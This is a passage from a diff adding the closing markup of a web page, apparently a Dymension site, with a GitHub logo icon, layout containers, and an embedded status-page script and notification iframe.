+          <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z">
+          </path>
+         </svg>
+        </span>
+       </a>
+      </div>
+     </div>
+    </div>
+    <div style="--messages-space: 12px;">
+     <div class="snackbars-container">
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="https://status.dymension.xyz/embed/script.js">
+  </script>
+  <iframe aria-hidden="true" src="https://vcfp1d6jsy3p.statuspage.io/embed/frame" style="position: fixed; border: none; box-shadow: rgba(9, 20, 66, 0.25) 0px 20px 32px -8px; z-index: 9999; transition: left 1s ease 0s, bottom 1s ease 0s, right 1s ease 0s; height: 115px; width: 320px; left: -9999px; right: -9999px; bottom: 60px;" tabindex="-1" title="Dymension Status">
+  </iframe>
+  <span aria-hidden="true" id="recharts_measurement_span" style="position: absolute; top: -20000px; left: 0px; padding: 0px; margin: 0px; border: none; white-space: pre;">
+   452K
+  </span>
+ </body>
+</html>
